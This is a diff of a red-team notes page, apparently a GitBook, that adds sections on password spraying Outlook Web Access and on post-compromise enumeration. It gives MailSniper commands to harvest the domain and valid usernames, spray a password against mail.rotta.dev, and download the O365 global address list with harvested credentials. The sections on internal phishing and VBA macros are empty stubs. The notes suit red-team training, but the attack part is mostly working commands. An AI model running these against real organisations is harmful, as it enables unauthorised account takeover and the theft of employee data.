@@ -2,11 +2,9 @@
 
 
 
+## Setting up Infrastructure&#x20;
 
-
-
-
-### Phishing Infrastructure
+### Phishing
 
 
 
@@ -124,28 +122,85 @@ Weak email security (SPF, DMARC and DKIM) may allow us to spoof emails to appear
 
 
 
-
-
 ## Initial Compromise
 
 ### Password Spraying
 
 Far from the best method of gaining access these days. All eyes are you from the SOC when performing these attacks. That said, password spraying incidents cause massive bloat in alerts for blue team. Some orgs may decide to exclude this activity entirely as they have measures in place to mitigate activity. Account lockouts, Conditional Access Policy (CAP), etc.
 
-#### Generate Wordlist
+#### Generate username wordlist
 
 There are many wordlist generators out there for usernames. Will not name them.
 
-* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ~/namemash.py names.txt > possible.txt
+* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ~/namemash.py users.txt > usernames.txt
   </strong></code></pre>
 
+#### Determine valid domain
+
+Choosing a tool comes down to preference, we'll use [MailSniper](https://github.com/dafthack/MailSniper) to determine a valid domain for OWA.
+
+* <pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\Users\PaulBlart\> ipmo C:\Tools\MailSniper\MailSniper.ps1
+  </strong><strong>
+  </strong>PS C:\Users\PaulBlart> Invoke-DomainHarvestOWA -ExchHostname mail.rotta.dev
+  [*] Harvesting domain name from the server at mail.rotta.dev
+  The domain appears to be: CYBER or rotta.dev
+  </code></pre>
+
+#### Find Valid Usernames Password
+
+Authentications on valid usernames take a little longer to process then invalid usernames, from this we can determine if a username in our wordlist is valid or is invalid.
+
+* ```powershell
+  PS C:\Users\PaulBlart> Invoke-UsernameHarvestOWA -ExchHostname mail.rotta.dev -Domain rotta.dev -UserList .\Desktop\usernames.txt 
+  -OutFile .\Desktop\valid_usernames.txt
+
+  [*] Now spraying the OWA portal at https://199.32.90.122/owa/
+  ```
+
+#### Spray Passwords
+
+If we decide to do this attack, it's best to take our time with this (depending on engagement timeframe). We are unable as red-teamers to determine account lockout configurations without access to the domain.
+
+* ```powershell
+  PS C:\Users\PaulBlart> Invoke-PasswordSprayOWA -ExchHostname mail.rotta.dev -UserList 
+  .\Desktop\valid_usernames.txt -Password FoxyLady123!
+  ```
 
 
 
+## Post Compromise / Enumeration & Reconnaisance
+
+### Harvested O365 Credentials
+
+#### Download Global Address List
+
+If we have valid credentials to an O365 account, we may be able to download the global address list of employees connected to O365.
+
+```powershell
+PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.rotta.dev 
+-UserName rotta.dev\cassy -Password FoxyLady123! -OutFile .\Desktop\gal.txt
+```
+
+### Internal Phishing
+
+
+
+
+
+### Initial Access Payloads
+
+Once we have access, our immediate next step is to gain persistence. The most optimal, but hardest, is to establish our Command & Control. To do so carries multiple barriers we have to overcome: User privileges, security solutions, firewall rules, etc. All of which means nothing unless our C\&C infrastructure is properly setup to avoid being flagged as suspicious (which will likely happen), or decrypted by Firewall / IDPS / DLP / EDR, amongst others. See above for more.
+
+There are two ways we can deliver this payload after compromising a O365 account:
+
+* Send the payload in a phishing email.
+* Send a URL to the victim that contains a download to the payload. (MOTW)
+
+
+
+### VBA Macros
+
+When&#x20;
 
 &#x20;
-
-*
-
-
 
